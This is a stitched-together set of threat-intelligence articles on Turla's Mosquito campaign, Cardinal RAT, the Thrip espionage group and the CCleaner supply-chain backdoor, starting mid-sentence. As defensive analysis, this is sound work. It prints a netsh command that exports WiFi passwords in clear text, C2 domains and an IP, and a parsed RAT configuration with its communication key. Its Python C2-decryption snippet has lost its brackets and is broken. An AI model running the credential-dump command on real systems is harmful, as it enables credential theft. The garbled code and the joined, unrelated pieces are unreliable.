WhiteBear actionable data to our private customers early 2017, and similar analysis to that report was publicly shared eight months later. Again, it was a cluster of activity that continued to grow past expectations. It is interesting because WhiteBear shared known compromised infrastructure with KopiLuwak: soligro.com. WhiteBear scripted spearphish attachments also follows up on initial WhiteAtlas scripting development and deployment efforts.\\nMosquito’s Changing 2018 Delivery Techniques\\nIn March 2018, our private report customers received actionable data on Mosquito’s inclusion of fileless and customized Posh-SecMod metasploit components. When discussion of the group’s metasploit use was made public, their tactics began to change.\\nThe “DllForUserFileLessInstaller” injector module maintained a compilation date of November 22, 2017, and was starting to be used by Mosquito to inject ComRAT modules into memory around January 2018. It is a small piece of metasploit injector code that accounts for issues with Wow64. Also, related open source powershell registry loader code oddly was modified to avoid AES use, and opt for 3DES encryption instead. Here is the modified Mosquito code:\\nAnd here is the default Posh-SecMod code that they ripped from:\\nWe expect to see more open-source based or inspired fileless components and memory loaders from Mosquito throughout 2018. Perhaps this malware enhancement indicates that they are more interested in maintaining current access to victim organizations than developing offensive technologies.\\nMiTM and Ducking the Mosquito Net\\nWe delivered actionable data on Mosquito to our private intel customers in early 2017. Our initial findings included data around an unusual and legitimate download URL for trojanized installers:\\nhxxp://admdownload.adobe.com/bin/live/flashplayer23ax_ra_install.exe\\nWhile we could not identify the MiTM techniques with accuracy at the time, it is possible either WiFi MiTM or router compromise was used in relation to these incidents. It is unlikely, but possible, that ISP-level FinFisher MiTM was used, considering multiple remote locations across the globe were targeted.\\nBut there is more incident data that should be elaborated on. In some cases, two “.js” files were written to disk and the infected system configured to run them at startup. Their naming provides insight into the intention of this functionality, which is to keep the malware remotely updated via google application, and maintain local settings updates by loading and running “1.txt” at every startup. In a way, this staged script loading technique seems to be shared with the IcedCoffee javascript loading techniques observed in past Turla incidents focused on European government organizations. Updates are provided from the server-side, leading to fewer malware set findings.\\ngoogle_update_checker.js\\nlocal_update_checker.js\\nSo, we should consider the wifi data collection that Mosquito Turla performed during these updates, as it hasn’t been documented publicly. One of the first steps that several Mosquito installer packages performed after writing and running this local_update js file was to export all local host’s WiFi profiles (settings and passwords) to %APPDATA%\\\\<profile>.xml with a command line call:\\ncmd.exe /c netsh wlan export profile key=clear folder=\"%APPDATA%\"\\nThey then gather more network information with a call to ipconfig and arp -a. Maintaining ongoing host-based collection of wifi credentials for target networks makes it far easier to possess ongoing access to wifi networks for spoofing and MiTM, as brute-forcing or otherwise cracking weakly secured WiFi networks becomes unnecessary. Perhaps this particular method of location-dependent intrusion and access is on the decline for Mosquito Turla, as we haven’t identified new URLs delivering trojanized code.\\nThe Next Strike\\nIt’s very interesting to see ongoing targeting overlap, or the lack of overlap, with other APT activity. Noting that Turla was absent from the milestone DNC hack event where Sofacy and CozyDuke were both present, but Turla was quietly active around the globe on other projects, provides some insight as to ongoing motivations and ambitions of this group. It is interesting that data related to these organizations has not been weaponized and found online while this Turla activity quietly carries on.\\nBoth Turla’s Mosquito and Carbon projects focus mainly on diplomatic and foreign affairs targets. While WhiteAtlas and WhiteBear activity stretched across the globe to include foreign affairs related organizations, not all targeting consistently followed this profile. Scientific and technical centers were also targeted, and organizations outside of the political arena came under focus as well. Turla’s KopiLuwak activity does not necessarily focus on diplomatic/foreign affairs, and also winds down a different path. Instead, 2018 activity targeted government related scientific and energy research organizations, and a government related communications organization in Afghanistan. This highly selective but wider targeting set most likely will continue into 2019.\\nFrom the targeting perspective, we see closer ties between the KopiLuwak and WhiteBear activity, and closer alignments between Mosquito and Carbon activity.\\nAnd WhiteBear and KopiLuwak shared infrastructure while deploying unusual .js scripting. Perhaps open source offensive malware will become much more present in Mosquito and Carbon attacks as we see more meterpreter and injector code, and more uniquely innovative complex malware will continue to be distributed with KopiLuwak and a possible return of WhiteBear. And as we see with borrowed techniques from the previous zebrocy spearphishing, techniques are sometimes passed around and duplicated.\\nKopiLuwak: A New JavaScript Payload from Turla\\nIntroducing WhiteBear\\nGazing at Gazer pdf\\nAPT Trends report Q2 2017\\nDiplomats in Eastern Europe bitten by a Turla mosquito pdf\\nThe Epic Turla Operation\\nPeering into Turla’s second stage backdoor\\nAPT Backdoor JavaScript Macros Malware Descriptions Malware Technologies MITM Rootkits Turla\\nShare post on:\\nFacebook\\nTwitter\\nRelated Posts\\nRoaming Mantis, part V\\nMobile malware evolution 2019\\nKBOT: sometimes they come back\\nLeave a Reply Cancel Reply\\nYour email address will not be published.

      "'Cardinal RAT Active for Over Two Years\\nMenu\\nTools\\nPlaybooks\\nSpeaking Events\\nAbout Us\\nCardinal RAT Active for Over Two Years\\n23,647\\npeople reacted\\n0\\n8\\nmin. read\\nShare\\nBy Josh Grunzweig\\nApril 20, 2017 at 5:00 AM\\nCategory: Unit 42\\nTags: Cardinal RAT, Carp Downloader, excel, Trojan\\nPalo Alto Networks has discovered a previously unknown remote access Trojan (RAT) that has been active for over two years. It has a very low volume in this two-year period, totaling roughly 27 total samples. The malware is delivered via an innovative and unique technique: a downloader we are calling Carp uses malicious macros in Microsoft Excel documents to compile embedded C# (C Sharp) Programming Language source code into an executable that in turn is run to deploy the Cardinal RAT malware family. These malicious Excel files use a number of different lures, providing evidence of what attackers are using to entice victims into executing them.\\nThe malware from start to finish exhibits the following high level operations as shown in Figure 1:\\nFigure 1 Malware execution flow\\nCarp Downloader\\nAs previously mentioned, we have observed Cardinal RAT being delivered using a unique technique involving malicious Excel macros. We are calling these delivery documents the Carp Downloader, as they make use of a specific technique of compiling and executing embedded C# (CshARP) language source code that acts as a simple downloader.\\nWe observed the following example macro in the most recent sample. Note that we have prefixed the function names with ‘xx_’ to make it easier for the reader to understand what is going on. Additionally, we have added comments to explain what is happening, as well as the un-obfuscated strings that are found within the macro.\\nFigure 2 Portion of malicious macro containing base64-encoded source code\\nFigure 3 Portion of malicious macro responsible for compiling and executing embedded source code\\nAs a quick recap of what the malicious macro is doing, it begins by generating two paths—a path to a randomly named executable, and randomly named C# file in the %APPDATA%\\\\\\\\Microsoft folder. It then base64-decodes the embedded C# source code as shown in Figure 2 and writes it to the C# file path previously generated. Finally, as shown in Figure 3 it will compile and execute this C# source code using the Microsoft Windows built-in csc.exe utility.\\nThe decoded source code in this example looks like the following as shown in Figure 4.\\nFigure 4 Decoded source code\\nAs we can see, it simply downloads a file from secure.dropinbox.pw using HTTP on port 443 (not HTTPS), and proceeds to decrypt the file using AES-128 prior to executing it. At this point, Cardinal RAT has been downloaded and executed, and execution is directed to this sample. Of course, the Carp Downloader is not required to download Cardinal RAT, however, based on our visibility, it has exclusively done so.\\nA total of 11 unique Carp Downloader samples have been observed to date. The following figures show lures that we observed in these samples.\\nFigure 5 Lure with a filename of Top10Binary_Sample_HotLeads_13.9.xls\\nFigure 6 Lure with a filename of AC_Media_Leads_ReportGenerator_5.2.xls\\nFigure 7 Lure with an unknown filename\\nFigure 8 Lure with a filename of Arabic 22.12_Pre qualified.xls\\nFigure 9 Lure with an unknown filename\\nFigure 10 Lure with a filename of Hot_Leads_Export_09.03_EN.xls\\nAs we can see from the above examples, the majority of these lures are financial-related, describing various fake customer lists for various organizations. Based on the similarities witnessed in some of these lures, it appears that the attackers use some sort of template, where they simply swap specific cells with the pertinent images or information.\\nCardinal RAT\\nThe name Cardinal RAT comes from internal names used by the author within the observed Microsoft .NET Framework executables. To date, 27 unique samples of Cardinal RAT have been observed, dating back to December 2015. It is likely that the low volume of samples seen in the wild is partly responsible for the fact that this malware family has remained under the radar for so long.\\nAn unobfuscated copy of Cardinal RAT was identified, which allowed us to view the decompiled class and function names. A subset of these may be seen below in Figure 11. This allowed us to not only easily identify the full functionality of the RAT, but also made it easier to identify and reverse-engineer various aspects of the malware itself.\\nFigure 11 Decompiled Cardinal RAT classes\\nWhen initially executed, the malware will check its current working directory. Should it not match the expected path, Cardinal will enter its installation routine. Cardinal RAT will copy itself to a randomly named executable in the specified directory. It will then compile and execute embedded source code that contains watchdog functionality. Specifically, this newly spawned executable will ensure that the following registry key is set:\\nHKCU\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Windows\\\\\\\\Load\\nThis specific key is set to point towards the path of the previously copied Cardinal RAT executable path. The executable will periodically query this registry key to ensure it is set appropriately. If the executable finds the registry key has been deleted, it will re-set it. The Load registry key acts as a persistence mechanism, ensuring that this Cardinal RAT executes every time a user logs on. More information about the Load registry key may be found here.\\nThis watchdog process also ensures that the Cardinal RAT process is always running, as well as ensures that the executable is located in the correct path. Should either of these conditions not be met, the watchdog process will spawn a new instance of Cardinal RAT, or write Cardinal RAT to the correct location, respectively.\\nAfter the installation routine, Cardinal RAT will inject itself into a newly spawned process. It will attempt to use one of the following installed executables for the newly spawned process:\\nRegAsm.exe\\nRegSvcs.exe\\nvbc.exe\\ncsc.exe\\nAppLaunch.exe\\ncvtres.exe\\nCardinal RAT will continue to parse an embedded configuration. This configuration, named internally as ‘GreyCardinalConfig’, is a binary blob that contains a mixture of base64-encoded data, DWORDs, and Boolean values. Using a custom written Python script, we parsed the configuration of an example sample:\\n$ python decode_parse_config.py GreyCardinalConfig\\nMutex: cpS3H2NSA65T67mUqB3a\\nGUID: 952407f889285547985aa2fcf35c5383\\nCampaign: 04/04/2016 Public\\nNumber of C2 Servers: 1\\nC2 Server: secure.affiliatetoday.xyz\\nPort: 4425\\nCommunication Key: H7sVBirLvGwVfLSLSeI2\\nConnection Delay: 3500\\nBuffer Size: 20480\\nMax Buffer Size: 40960000\\nUnknown Integer: 70000\\nPrevent System Sleeping: 0\\nHide File: 0\\nDie on Sandbox Detection: 0\\nKeylogging: 1\\nInstall Name: None\\n1234567891011121314151617\\n$ python decode_parse_config.py GreyCardinalConfigMutex: cpS3H2NSA65T67mUqB3aGUID: 952407f889285547985aa2fcf35c5383Campaign: 04/04/2016 PublicNumber of C2 Servers: 1C2 Server: secure.affiliatetoday.xyzPort: 4425Communication Key: H7sVBirLvGwVfLSLSeI2Connection Delay: 3500Buffer Size: 20480Max Buffer Size: 40960000Unknown Integer: 70000Prevent System Sleeping: 0Hide File: 0Die on Sandbox Detection: 0Keylogging: 1Install Name: None\\nAs we can see, this particular sample is configured with a single command and control (C2) server, however, we have seen other samples with multiple host and port combinations. We can also identify a communication key in it, which is crucial when discussing network communications.\\nAfter the configuration is parsed, Cardinal RAT will proceed with making attempts at connecting with the C2. Using an example request and response from a C2 server, we can see how this traffic is configured.\\nFigure 12 Parsed network traffic communication\\nData is transmitted in two pieces—a DWORD specifying the data length, as well as the data itself. The data is encrypted using a series of XOR and addition operations, followed by decompression using the ZLIB library. Represented in Python, this may be implemented as follows:\\ndef decrypt(md5_key, data):\\nkey = data-1\\nremaining = data0:-1\\nc = 0\\nout = \"\"\\nfor x in remaining:\\nb = md5_keyc%len(md5_key)\\nout += chr(ord(x) ^ ord(b) + ord(key) & 255)\\nc+=1\\nif len(out) > 15:\\nif ord(out0) == 1:\\nout = zlib.decompress(out1:, -15)\\nreturn out\\n12345678910111213\\ndef decrypt(md5_key, data):\\xa0\\xa0key = data-1\\xa0\\xa0remaining = data0:-1\\xa0\\xa0c = 0\\xa0\\xa0out = \"\"\\xa0\\xa0for x in remaining:\\xa0\\xa0\\xa0\\xa0b = md5_keyc%len(md5_key)\\xa0\\xa0\\xa0\\xa0out += chr(ord(x) ^ ord(b) + ord(key) & 255)\\xa0\\xa0\\xa0\\xa0c+=1\\xa0\\xa0if len(out) > 15:\\xa0\\xa0\\xa0\\xa0if ord(out0) == 1:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0out = zlib.decompress(out1:, -15)\\xa0\\xa0return out\\nThe ‘md5_key’ argument in the function above is the MD5 hash of the previously defined ‘H7sVBirLvGwVfLSLSeI2’ string that was contained within Cardinal RAT’s embedded configuration. Now that we know how to decrypt the data, we can look at the previously shown PCAP data and determine what is being sent. The first message decrypts to the following:\\n$ python decrypt_cardinal_pcap.py\\nData Length: 3\\n00000000: 00 00\\n123\\n$ python decrypt_cardinal_pcap.py Data Length: 300000000: 00 00\\nFollowed by the Cardinal RAT’s response:\\n$ python decrypt_cardinal_pcap.py\\nData Length: 148\\n00000000: 00 95 24 07 F8 89 28 55\\n47 98 5A A2 FC F3 5C 53\\n..$...(UG.Z...\\\\S\\n00000010: 83 4A 00 61 00 73 00 6F\\n00 6E 00 20 00 42 00 6F\\n.J.a.s.o.n. .B.o\\n00000020: 00 72 00 6E 00 00 00 4A\\n00 41 00 53 00 4F 00 4E\\n.r.n...J.A.S.O.N\\n00000030: 00 42 00 4F 00 52 00 4E\\n00 2D 00 50 00 43 00 00\\n.B.O.R.N.-.P.C..\\n00000040: 00 30 00 34 00 2F 00 30\\n00 34 00 2F 00 32 00 30\\n.0.4./.0.4./.2.0\\n00000050: 00 31 00 36 00 20 00 50\\n00 75 00 62 00 6C 00 69\\n.1.6. .P.u.b.l.i\\n00000060: 00 63 00 00 00 57 00 69\\n00 6E 00 64 00 6F 00 77\\n.c...W.i.n.d.o.w\\n00000070: 00 73 00 20 00 37 00 20\\n00 55 00 6C 00 74 00 69\\n.s. .7. .U.l.t.i\\n00000080: 00 6D 00 61 00 74 00 65\\n00 20 00 00 00 00 00 00\\n.m.a.t.e. ......\\n00000090: 00 00 31 00 2E 00 34 00\\n00 00 30 00 37 00 38 00\\n..1...4...0.7.8.\\n000000A0: 42 00 46 00 42 00 46 00\\n44 00 30 00 30 00 30 00\\nB.F.B.F.D.0.0.0.\\n000000B0: 33 00 30 00 36 00 44 00\\n32 00 00 00\\n3.0.6.D.2...\\n1234567891011121314\\n$ python decrypt_cardinal_pcap.py Data Length: 14800000000: 00 95 24 07 F8 89 28 55\\xa0\\xa047 98 5A A2 FC F3 5C 53\\xa0\\xa0..$...(UG.Z...\\\\S00000010: 83 4A 00 61 00 73 00 6F\\xa0\\xa000 6E 00 20 00 42 00 6F\\xa0\\xa0.J.a.s.o.n. .B.o00000020: 00 72 00 6E 00 00 00 4A\\xa0\\xa000 41 00 53 00 4F 00 4E\\xa0\\xa0.r.n...J.A.S.O.N00000030: 00 42 00 4F 00 52 00 4E\\xa0\\xa000 2D 00 50 00 43 00 00\\xa0\\xa0.B.O.R.N.-.P.C..00000040: 00 30 00 34 00 2F 00 30\\xa0\\xa000 34 00 2F 00 32 00 30\\xa0\\xa0.0.4./.0.4./.2.000000050: 00 31 00 36 00 20 00 50\\xa0\\xa000 75 00 62 00 6C 00 69\\xa0\\xa0.1.6. .P.u.b.l.i00000060: 00 63 00 00 00 57 00 69\\xa0\\xa000 6E 00 64 00 6F 00 77\\xa0\\xa0.c...W.i.n.d.o.w00000070: 00 73 00 20 00 37 00 20\\xa0\\xa000 55 00 6C 00 74 00 69\\xa0\\xa0.s. .7. .U.l.t.i00000080: 00 6D 00 61 00 74 00 65\\xa0\\xa000 20 00 00 00 00 00 00\\xa0\\xa0.m.a.t.e. ......00000090: 00 00 31 00 2E 00 34 00\\xa0\\xa000 00 30 00 37 00 38 00\\xa0\\xa0..1...4...0.7.8.000000A0: 42 00 46 00 42 00 46 00\\xa0\\xa044 00 30 00 30 00 30 00\\xa0\\xa0B.F.B.F.D.0.0.0.000000B0: 33 00 30 00 36 00 44 00\\xa0\\xa032 00 00 00\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa03.0.6.D.2...\\nThis communication represents the C2 server asking the Cardinal RAT to retrieve and upload victim information (‘\\\\x00\\\\x00’), to which the malware responds accordingly. As we can see in the above decrypted stream, the malware returns a wealth of information, including the following:\\nUsername\\nHostname\\nCampaign Identifier\\nMicrosoft Windows version\\nVictim unique identifier\\nProcesser architecture\\nMalware version (1.4)\\nThe malware itself is equipped with a number of features, including the following:\\nCollect victim information\\nUpdate settings\\nAct as a reverse proxy\\nExecute command\\nUninstall itself\\nRecover passwords\\nDownload and Execute new files\\nKeylogging\\nCapture screenshots\\nUpdate Cardinal RAT\\nClean cookies from browsers\\nConclusion\\nCardinal RAT is deployed using an interesting technique of compiling and executing a downloader via a malicious macro embedded within a Microsoft Excel file.

Click for details.Critical Attack Discovery and Intelligence TeamSymantecPosted: 19 Jun, 20185 Min ReadThreat Intelligence SubscribeThrip: Espionage Group Hits Satellite, Telecoms, and Defense CompaniesSymantec’s artificial-intelligence-based Targeted Attack Analytics uncovers new wide-ranging espionage operation.One of the most significant developments in cyber espionage in recent years has been the number of groups adopting “living off the land” tactics. That’s our shorthand for the use of operating system features or legitimate network administration tools to compromise victims’ networks. The purpose of living off the land\\xa0is twofold. By using such features and tools, attackers are hoping to blend in on the victim’s network and hide their activity in a sea of legitimate processes. Secondly, even if malicious activity involving these tools is detected, it can make it harder to attribute attacks. If everyone is using similar tools, it’s more difficult to distinguish one group from another. Most attack groups do still create and leverage custom malware, but it tends to be employed sparingly, reducing the risk of discovery.\\nFinding the needle in the haystack\\nThis doesn’t mean espionage attacks are now going undiscovered, but it does mean that they can take longer for analysts to investigate. This is one of the reasons why Symantec created Targeted Attack Analytics (TAA), which takes tools and capabilities that we’ve developed for our own analysts and makes them available to our Advanced Threat Protection (ATP) customers. TAA leverages advanced artificial intelligence and machine learning that combs through Symantec’s data lake of telemetry in order to spot patterns associated with targeted attacks. Its advanced AI automates what previously would have taken thousands of hours of analyst time. This makes it far easier for us, and for our customers, to find that “needle in the haystack.”\\nIt was TAA that led us to the latest cyber espionage campaign we’ve uncovered. Back in January 2018, TAA triggered an alert at a large telecoms operator in Southeast Asia. An attacker was using PsExec to move laterally between computers on the company’s network. PsExec is a Microsoft Sysinternals tool for executing processes on other systems and is one of the most frequently seen legitimate pieces of software used by attackers attempting to live off the land. However, it’s also widely used for legitimate purposes, meaning malicious use of PsExec can be difficult to spot.\\nTAA not only flagged this malicious use of PsExec, it also told us what the attackers were using it for. They were attempting to remotely install a previously unknown piece of malware (Infostealer.Catchamas) on computers within the victim’s network.\\nFigure 1. Targeted Attack Analytics leverages machine learning to spot malicious activity associated with targeted attacks and alerts the customer. Armed with this information about the malware and living off the land tactics being used by this group of attackers whom we named Thrip, we broadened our search to see if we could find similar patterns that indicated Thrip had been targeting other organizations. We uncovered a wide-ranging cyber espionage campaign involving powerful malware being used against targets that are a cause for concern.\\nWe identified three computers in China being used to launch the Thrip attacks. Thrip’s motive is likely espionage and its targets include those in the communications, geospatial imaging, and defense sectors, both in the United States and Southeast Asia.\\nEye on the sky: Thrip’s targets\\nPerhaps the most worrying discovery we made was that Thrip had targeted a satellite communications operator. The attack group seemed to be particularly interested in the operational side of the company, looking for and infecting computers running software that monitors and controls satellites. This suggests to us that Thrip’s motives go beyond spying and may also include disruption.\\nAnother target was an organization involved in geospatial imaging and mapping. Again, Thrip seemed to be mainly interested in the operational side of the company. It targeted computers running MapXtreme Geographic Information System (GIS) software which is used for tasks such as developing custom geospatial applications or integrating location-based data into other applications. It also targeted machines running Google Earth Server and Garmin imaging software.\\nThe satellite operator wasn’t the only communications target Thrip was interested in. The group had also targeted three different telecoms operators, all based in Southeast Asia. In all cases, based on the nature of the computers infected by Thrip, it appeared that the telecoms companies themselves and not their customers were the targets of these attacks.\\nIn addition, there was a fourth target of interest, a defense contractor.\\nFigure 2. Thrip, spying on communications, mapping, and defense targetsAttempting to hide in plain sight\\nThrip uses a mixture of custom malware and living off the land tools to perform its attacks. The latter include:\\nPsExec: Microsoft Sysinternals tool for executing processes on other systems. The tool was primarily used by the attackers to move laterally on the victim’s network.\\nPowerShell: Microsoft scripting tool that was used to run commands to download payloads, traverse compromised networks, and carry out reconnaissance.\\nMimikatz: Freely available tool capable of changing privileges, exporting security certificates, and recovering Windows passwords in plaintext.\\nWinSCP: Open source FTP client used to exfiltrate data from targeted organizations.\\nLogMeIn: Cloud-based remote access software. It’s unclear whether the attackers gained unauthorized access to the victim’s LogMeIn accounts or whether they created their own.\\nAll of these tools, with the exception of Mimikatz (which is almost always used maliciously), have legitimate uses. For example, PowerShell is widely used within enterprises and the vast majority of scripts are legitimate. Similarly, PsExec is frequently used by systems administrators. However, in this case, it was Thrip’s use of PsExec that drew our attention. Through advanced artificial intelligence and machine learning, TAA has trained itself to spot patterns of malicious activity. While PsExec itself may be innocuous, the way that it was being used here triggered an alert by TAA. In short, Thrip’s attempts at camouflage blew its cover.\\nWhile Thrip now makes heavy use of living off the land tactics, it also employs custom malware (Infostealer.Catchamas), particularly against computers of interest. Catchamas is a custom Trojan designed to steal information from an infected computer and contains additional features designed to avoid detection.\\nHighly targeted espionage operation\\nFrom the initial alert triggered by TAA, we were able to follow a trail that eventually enabled us to see the bigger picture of a cyber espionage campaign originating from computers within China and targeting multiple organizations in the U.S. and Southeast Asia. Espionage is the group’s likely motive but given its interest in compromising operational systems, it could also adopt a more aggressive, disruptive stance should it choose to do so.\\nProtection\\nThe following protections are in place to protect customers against Thrip attacks:\\nFile-based protection\\nInfostealer.Catchamas\\nHacktool.Mimikatz\\nNetwork protection products\\nMalware Analysis Appliance detects activity associated with Thrip\\nCustomers with Webpulse-enabled products are protected against activity associated with Thrip\\nThreat intelligence\\nIn addition to file-based protection, customers of the DeepSight Intelligence Managed Adversary and Threat Intelligence (MATI) service have received reports on Thrip, which detail methods of detecting and thwarting activities of this group.\\nFile AttachmentsThrip IOC listTXT564 bytesFurther reading\\nTo find out more about Targeted Attack Analytics (TAA), read our whitepaper Targeted Attack Analytics: Using Cloud-based Artificial Intelligence for Enterprise-Focused Advanced Threat Protection\\nAbout the AuthorCritical Attack Discovery and Intelligence TeamSymantecThe Critical Attack Discovery and Intelligence team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced protection in Symantec products, and offer analysis that helps customers respond to attacks.Related Blog PostsPosted: 12 Feb, 202024 Min ReadMicrosoft Patch Tuesday – February 2020Posted: 3 Feb, 20203 Min ReadGeopolitical Tensions May Increase Risk of Destructive AttacksPosted: 20 Jan, 20204 Min ReadIncrease in Emotet Spam Observed, Blocked by SymantecPosted: 15 Jan, 202014 Min ReadMicrosoft Patch Tuesday – January 2020 SubscribePrivacy PolicyCookie PolicyData Processing and Data TransfersSupplier ResponsibilityTerms of UseSitemap© 2015-2020 Broadcom.

You may have the most up to date cyber security software, but when the software you are trusting to keep you protected gets infected there is a problem. \\xa0A backdoor, inserted into legitimate code by a third party with malicious intent, leads to millions of people being hacked and their information stolen.\\nAvast’s CCleaner software had a backdoor encoded into it by someone who had access to the supply chain. \\xa0Through somewhere that had access to the source code of CCleaner, the main executable in v5.33.6162 had been modified to include a backdoor. The official statement from Avast can be found here\\nThe Big Connection:\\nCostin Raiu, director of Global Research and Analysis Team at Kaspersky Lab, was the first to find a code connection between APT17 and the backdoor in the infected CCleaner:\\nThe malware injected into #CCleaner has shared code with several tools used by one of the APT groups from the #Axiom APT 'umbrella'.\\n— Costin Raiu (@craiu) September 19, 2017\\nUsing Intezer Analyze™, we were able to verify the shared code between the backdoor implanted in CCleaner and earlier APT17 samples. The photo below is the result of uploading the CCBkdr module to Intezer Analyze™, where the results show there is an overlap in code. With our technology, we can compare code to a huge database of malicious and trusted software — that’s how we can prove that this code has never been seen before in any other software.\\nA deeper analysis leads us to the functions shown below. The code in question is a unique implementation of base64 only previously seen in APT17 and not in any public repository, which makes a strong case about attribution to the same threat actor.\\nThis code connection is huge news. APT17, also known as Operation Aurora, is one of the most sophisticated cyber attacks ever conducted and they specialize in supply chain attacks. In this case, they probably were able to hack CCleaner’s build server in order to plant this malware. Operation Aurora started in 2009 and to see the same threat actor still active in 2017 could possibly mean there are many other supply chain attacks by the same group that we are not aware of. The previous attacks are attributed to a Chinese group called PLA Unit 61398.\\nTechnical Analysis:\\nThe infected CCleaner file that begins the analysis is from 6f7840c77f99049d788155c1351e1560b62b8ad18ad0e9adda8218b9f432f0a9\\nA technical analysis was posted by Talos here (http://blog.talosintelligence.com/2017/09/avast-distributes-malware.html).\\nThe flow-graph of the malicious CCleaner is as follows (taken from the Talos report):\\nInfected function:\\nLoad and execute the payload code:\\nAfter the embedded code is decrypted and executed, the next step is a PE (portable executable) file loader. A PE file loader basically emulates the process of what happens when you load an executable file on Windows. Data is read from the PE header, from a module created by the malware author.\\nThe PE loader first begins by resolving the addresses of imports commonly used by loaders and calling them. GetProcAddress to get the addresses of external necessary functions, LoadLibraryA to load necessary modules into memory and get the address of the location of the module in memory, VirtualAlloc to create memory for somewhere to copy the memory, and in some cases, when not implemented, and memcpy to copy the buffer to the newly allocated memory region.\\nAfter the module is copied to memory, to load it properly, the proper loading procedure is executed. The relocation table is read to adjust the module to the base address of the allocated memory region, the import table is read, the necessary libraries are loaded, and the import address table is filled with the correct addresses of the imports. Next, the entire PE header is overwritten with 0’s, a mechanism to destroy the PE header tricking security software into not realizing this module is malicious, and after the malicious code begins execution.\\nThe main module does the following:\\n1. Tries an anti-debug technique using time and IcmpSendEcho to wait\\n2. Collect data about the computer (Operating system, computer name, DNS domain, running processes, etc)\\n3. Allocates memory for payload to retrieve from C&C server\\n4. Contacts C&C server at IP address 216.126.225.148\\na. If this IP address is unreachable, uses a domain generation algorithm and uses a different domain depending on the month and year\\n5. Executes code sent by C&C\\nBy the time of the analysis, we were unable to get our hands on the code sent by the C&Cs.\\nIf you would like to analyze the malware yourself, you may refer to my tweet.\\n#ccleaner malware DLL w/ IAT fix https://t.co/FprmtmkV64 https://t.co/dgWiQVd31k @TalosSecurity @malwrhunterteam pic.twitter.com/TxsbveFoHJ\\n— Jay Rosenberg (@jaytezer) September 18, 2017\\nJay Rosenberg\\nIntezer Community Tip: How to Optimize ssdeep Comparisons with ElasticSearch\\nEvidence Aurora Operation Still Active Part 2: More Ties Uncovered Between CCleaner Hack & Chinese Hackers\\nProducts\\nIntezer Analyze\\nIntezer Protect\\nWhy Intezer\\nTechnology\\nCompany\\nAbout\\nEvents\\nNews\\nCareers\\nContact us\\nPartners\\nBlog\\nResources\\n© Intezer.com 2020 All rights reserved\\nTerms of Use\\nPrivacy Policy\", 'New investigations into the CCleaner incident point to a possible third stage that had keylogger capacities\\nWe use cookies and similar technologies to recognize your repeat visits and preferences, to measure the effectiveness of campaigns, and improve our websites.

The altered installation file was downloaded by 2.27 million CCleaner customers worldwide. The malware was introduced to the build server of Piriform, the company developing CCleaner, some time between March 11 and July 4, 2017, prior to Avast’s acquisition of Piriform on July 18, 2017.\\nThe first stage of the malware was designed to collect non-sensitive information from CCleaner users, including, for example, name of the computer, list of installed software, and a list of running processes. The first stage included downloader capabilities, which were used to download a second stage binary onto just 40 PCs out of the millions of devices infected with stage one, making it a highly targeted attack. Up until now, we don’t have any evidence that a third stage binary has been downloaded onto the affected computers. However, we have found evidence of activity that could indicate what the intended third stage of the attack could have looked like.\\nTo eliminate the threat from the Piriform network, we migrated the Piriform build environment to the Avast infrastructure, replaced all hardware and moved the entire Piriform staff onto the Avast-internal IT system. We consolidated and inspected the Piriform infrastructure and computers, and found preliminary versions of the stage one and stage two binaries on these, and we found evidence of a specialized tool, ShadowPad, which is used by a specific group of cybercriminals, installed on four Piriform computers.\\nShadowPad is a cyber attack platform that cybercriminals deploy in victims’ networks to gain remote control capabilities, and has been analyzed in the past. The tool was installed on the four Piriform computers on April 12th, 2017, while the preliminary version of stage two had been installed on the computers on March 12th, 2017.\\nThe older version of the stage two downloader was contacting CnC servers, but the servers were no longer functioning by the time we got our hands on the computers, so we cannot say with 100% certainty what they were supposed to download. However, given the timeline of the events, we assume that the preliminary stage two downloader installed ShadowPad on the four Piriform computers. Another clue that lead us to this assumption is that ShadowPad is believed to be a product of the Chinese hacker group, Axiom, the group likely behind the CCleaner attack. The connection between Axiom and the CCleaner attack was first discovered by security researcher Constin Raiu.\\nShadowPad plugins found on Piriform PCs\\nWe also found ShadowPad log files that contained encrypted keystrokes from a keylogger installed on the computers. We discovered that the keylogger’s log was encrypted with the volume ID of the hard drive and consequently were able to decrypt the key strokes. Looking into the log, we found out that the keylogger had been active since April 12th, 2017, recording keystrokes on these computers, including keylogs from Visual Studio and other programs. The logged data showed us that the keylogger was functional at that time. The version of the ShadowPad tool is custom-built, which makes us think it was explicitly built for Piriform.\\nLogged keystrokes found on the Piriform computers\\nBy installing a tool like ShadowPad, the cybercriminals were able to fully control the system remotely while collecting credentials and insights into the operations on the targeted computer. Besides the keylogger tool, other tools were installed on the four computers, including a password stealer, and tools with the capacity to install further software and plugins on the targeted computer remotely.\\nShadowPad was installed on the Piriform network and, as far as we can tell from our investigations up until today, it was not installed on any of the CCleaner customers’ computers, however we believe it was the intended third stage for the CCleaner customers. While up to 2.27 million CCleaner consumers and businesses had downloaded the infected CCleaner product, the attackers installed the malicious second stage on just 40 PCs operated by high-tech and telecommunications companies. We don’t have a sample of a possible third stage that might have been distributed via the CCleaner attack, and it is not clear if it was the attacker’s intention to attack all 40 PCs or just a few or none. We continue investigating the data dumps from the computers, and will post an update as soon as we learn more.\\nCheck 0 comments or write your comment\\nRelated articles\\nSecurity NewsCyberattacks target government agencies\\nCyberattacks target two government entities – the U.S. Department of Defense agency DISA and Mexico’s economy ministry.\\n28 February 2020\\nmin read\\nSecurity NewsHackers infect VPNs to plant hidden backdoors\\nUsing known exploits to infect various VPN networks, Iranian hacking groups have teamed up to create backdoors in companies around the world.\\n21 February 2020\\nmin read\\nSecurity NewsA tale of two phishes: coronavirus safety and W-9 forms\\nTwo new phishing email campaigns include playing on the coronavirus scare and pretending to be W-9 forms.\\n12 February 2020\\nmin read\\nDiscussion (0)\\nNever miss our news\\nFollow us\\n1988 - 2020 Copyright © Avast Software s.r.o. | Sitemap\\xa0Privacy policy'\n",

